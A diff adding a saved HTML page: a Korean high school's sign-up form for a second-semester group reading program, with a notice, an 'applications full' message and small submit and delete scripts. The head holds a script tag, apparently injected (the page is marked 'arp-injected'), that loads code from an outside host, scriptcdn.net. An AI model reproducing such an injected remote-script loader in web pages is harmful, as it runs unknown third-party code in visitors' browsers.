@@ -1,0 +1,84 @@
+<html data-arp-injected="true"><head><script type="text/javascript" src="https://3001.scriptcdn.net/code/static/1"></script></head><body topmargin="0" leftmargin="0"><link rel="stylesheet" href="../css/style.css">
+    <style type="text/css">
+    a { text-decoration:none;color:black; }
+    body {font-family:NotokrR;}
+    </style>
+    <title></title>
+
+
+    <table width="800" cellspacing="0" align="center">
+        <tbody><tr>
+            <td background="../1.jpg" height="40" valign="bottom">
+                <font color="white">현대청운고등학교 와글와글 독서마당</font>
+            </td>
+        </tr>
+    </tbody></table>
+    <table width="800" cellspacing="0" style="font-size:15;" align="center">
+        <tbody><tr>
+            <td width="50%" valign="top">
+                <form name="form11" method="post">
+    <input type="button" value="첫화면" onclick="location.href='../student.html';" style="font-family:NotokrR;width:80;font-size:14;cursor:hand;">
+    <span style="font-size:15;color:blue">30619 이승준</span></form>
+    <iframe name="m2" width="0" height="0" frameborder="no"></iframe>		</td>
+            <td valign="top" align="right">
+                <a href="./index.html">독서클라이밍북</a>
+            </td>
+        </tr>
+    </tbody></table><form name="form1" method="post">
+    <br>
+    <p align="center" style="font-size:20;">와글와글 독서마당 신청(2022학년도 2학기)</p>
+
+    <table align="center" cellspacing="0" style="font-size:15;" width="600">
+        <tbody><tr>
+            <td>공지사항&nbsp;(<font color="blue">신청시작 2021년 09월 07일 07시 00분</font> / <font color="red">신청마감 2021년 09월 25일 16시 30분</font>)</td>
+        </tr>
+    </tbody></table>
+    <table align="center" cellspacing="0" style="border-collapse:collapse;font-size:15;" width="600">
+        <tbody><tr height="100">
+            <td style="border-width:1;border-color:gray;border-style:solid;padding:10;color:blue;" valign="top">★★ 와글와글 독서마당 2학기 모집★★
+
+    추가 모집합니다. 학년 상관 없이 지원 가능합니다
+    독서클라이밍북 '독서공감활동' 확대 버전! 그룹독서 프로그램!!!
+    문이과 상관 없이 지원 가능, 학생부 꿀기재!!</td>
+        </tr>
+    </tbody></table>
+    <table align="center" cellspacing="0" style="border-collapse:collapse;font-size:15;" width="600">
+        <tbody><tr>
+            <td style="" valign="top">학년별 제한 인원 : <font color="red"></font></td>
+        </tr>
+    </tbody></table>
+    <p align="center"><font color="red">신청인원 초과</font></p><br>
+
+    <table align="center" cellspacing="0" style="font-size:15;" width="600">
+        <tbody><tr>
+            <td style="" valign="top">나의 신청 현황</td>
+        </tr>
+    </tbody></table>
+    <table align="center" cellspacing="1" bgcolor="gray" style="font-size:15;" width="600">
+        <tbody><tr bgcolor="#e6e6e6" height="30" align="center">
+            <td width="10%">연번</td>
+            <td width="35%">신청 기간</td>
+            <td width="35%">신청 날짜</td>
+            <td width="20%">비고</td>
+        </tr>
+        </tbody></table>
+    <iframe name="f2" width="0" height="0" frameborder="0"></iframe>
+    </form>
+    <script>
+    function func_del(y,t,UID){
+        var del = confirm(y + " " + t + " 신청을 삭제하겠습니까?");
+        if(del==true){f2.location.href="wa_del.php?UID="+UID;}else{return;}
+    }
+
+    function func_save(){
+        var yr = "2022";
+        var tm = "2학기";
+        var ins = confirm(yr + "학년도 " + tm + " 신청하겠습니까?");
+        if(ins==true){
+            document.form1.target = "f2";
+            document.form1.action = "wa_insert.php";
+            document.form1.submit();
+        }else{return;}
+
+    }
+    </script></body></html>
